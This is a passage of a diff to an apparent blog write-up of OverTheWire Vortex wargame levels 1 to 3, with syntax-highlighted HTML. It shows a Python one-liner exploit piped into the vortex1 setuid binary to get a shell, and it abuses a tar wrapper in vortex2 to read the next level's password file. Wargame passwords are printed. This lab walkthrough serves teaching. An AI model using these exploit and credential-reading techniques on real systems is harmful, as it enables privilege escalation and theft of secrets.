+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;import sys; sys.stdout.write(&quot;</span><span class="se">\\</span><span class="s">&quot; * (0xffffe470-0xcaffffff) + &quot;</span><span class="se">\x00</span><span class="s">&quot;)&#39;</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> \
+</span><span class='line'>  <span class="o">|</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Aside: the Python command is run in a subshell with an extra <code>cat</code> to keep the <code>/bin/sh</code> listening
@@ -372,35 +515,98 @@ seemingly arbitrary 261, we&rsquo;ll use 512/2 + 5. This is more descriptive bec
 the <code>ptr</code> reference from where it starts in the middle of <code>buf[512]</code> back to the beginning and then
 past the <code>x</code> and one byte into itself.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(python -c 'import sys; sys.stdout.write("\\" * (512/2 + 5) + "\xca" + "A")'; cat) \
-</span><span class='line'>  | /vortex/vortex1
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;import sys; sys.stdout.write(&quot;</span><span class="se">\\</span><span class="s">&quot; * (512/2 + 5) + &quot;</span><span class="se">\xca</span><span class="s">&quot; + &quot;A&quot;)&#39;</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> \
+</span><span class='line'>  <span class="o">|</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span>
 </span><span class='line'>
-</span><span class='line'>id
-</span><span class='line'>uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="nb">id</span>
+</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">5002</span><span class="p">(</span><span class="n">vortex2</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">5001</span><span class="p">(</span><span class="n">vortex1</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">5002</span><span class="p">(</span><span class="n">vortex2</span><span class="p">),</span><span class="mi">5001</span><span class="p">(</span><span class="n">vortex1</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
-<p>The wargame instructions don&rsquo;t tell us this, but each user&rsquo;s password is located in the directory
-below. Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>
+<p>Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
 <span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ls /etc/vortex_pass
-</span><span class='line'>vortex0   vortex11  vortex14  vortex17    vortex2   vortex22  vortex25  vortex5  vortex8
-</span><span class='line'>vortex1   vortex12  vortex15  vortex18    vortex20  vortex23  vortex3   vortex6  vortex9
-</span><span class='line'>vortex10  vortex13  vortex16  vortex19    vortex21  vortex24  vortex4   vortex7
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ls</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span>
+</span><span class='line'><span class="n">vortex0</span>   <span class="n">vortex11</span>  <span class="n">vortex14</span>  <span class="n">vortex17</span>    <span class="n">vortex2</span>   <span class="n">vortex22</span>  <span class="n">vortex25</span>  <span class="n">vortex5</span>  <span class="n">vortex8</span>
+</span><span class='line'><span class="n">vortex1</span>   <span class="n">vortex12</span>  <span class="n">vortex15</span>  <span class="n">vortex18</span>    <span class="n">vortex20</span>  <span class="n">vortex23</span>  <span class="n">vortex3</span>   <span class="n">vortex6</span>  <span class="n">vortex9</span>
+</span><span class='line'><span class="n">vortex10</span>  <span class="n">vortex13</span>  <span class="n">vortex16</span>  <span class="n">vortex19</span>    <span class="n">vortex21</span>  <span class="n">vortex24</span>  <span class="n">vortex4</span>   <span class="n">vortex7</span>
 </span><span class='line'>
-</span><span class='line'>cat /etc/vortex_pass/vortex2
-</span><span class='line'>23anbT\rE</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span><span class="n">vortex2</span>
+</span><span class='line'><span class="mi">23</span><span class="n">anbT</span>\<span class="n">rE</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h1><a href="https://overthewire.org/wargames/vortex/vortex2.html">Vortex Level 2 -> Level 3</a></h1>
+
+<p><details>
+  <summary>Hint 1: number of args</summary>
+  You don&rsquo;t need to use all the available <code>argv</code> slots used in the executable.
+</details></p>
+
+<p><details>
+  <summary>Hint 2: <code>$$</code></summary>
+  What is <code>$$</code>? What is its value in the context of the executable?
+</details></p>
+
+<p><details>
+  <summary>Hint 3: file to tar</summary>
+  What file do you need to read? How can you use the program to read it?
+</details></p>
+
+<h2>My solution</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex2</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span><span class="n">vortex3</span>
+</span><span class='line'><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">tar</span><span class="p">:</span> <span class="n">Removing</span> <span class="n">leading</span> <span class="err">`</span><span class="o">/</span><span class="s">&#39; from member names</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">ail</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span><span class="err">$$</span><span class="o">.</span><span class="n">tar</span>
+</span><span class='line'><span class="n">ls</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">access</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span><span class="mf">1657.</span><span class="n">tar</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">ail</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span>\<span class="err">$$</span><span class="o">.</span><span class="n">tar</span>
+</span><span class='line'><span class="mi">2670</span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">vortex3</span> <span class="n">vortex2</span> <span class="mi">10240</span> <span class="n">Dec</span> <span class="mi">26</span> <span class="mi">21</span><span class="p">:</span><span class="mi">15</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span><span class="err">$$</span><span class="o">.</span><span class="n">tar</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">tar</span> <span class="o">-</span><span class="n">xvf</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ownership</span><span class="o">.</span>\<span class="err">$$</span><span class="o">.</span><span class="n">tar</span>
+</span><span class='line'><span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span><span class="n">vortex3</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">ail</span> <span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span>
+</span><span class='line'><span class="n">total</span> <span class="mi">12</span>
+</span><span class='line'><span class="mi">2808</span> <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">vortex2</span> <span class="n">vortex2</span> <span class="mi">4096</span> <span class="n">Dec</span> <span class="mi">26</span> <span class="mi">21</span><span class="p">:</span><span class="mi">16</span> <span class="o">.</span>
+</span><span class='line'><span class="mi">2689</span> <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">vortex2</span> <span class="n">vortex2</span> <span class="mi">4096</span> <span class="n">Dec</span> <span class="mi">26</span> <span class="mi">21</span><span class="p">:</span><span class="mi">16</span> <span class="o">..</span>
+</span><span class='line'><span class="mi">2809</span> <span class="o">-</span><span class="n">r</span><span class="o">--------</span> <span class="mi">1</span> <span class="n">vortex2</span> <span class="n">vortex2</span>   <span class="mi">10</span> <span class="n">Nov</span>  <span class="mi">4</span>  <span class="mi">2019</span> <span class="n">vortex3</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">vortex2</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">etc</span><span class="o">/</span><span class="n">vortex_pass</span><span class="o">/</span><span class="n">vortex3</span>
+</span><span class='line'><span class="mi">64</span><span class="n">ncXTvx</span><span class="c">#</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 
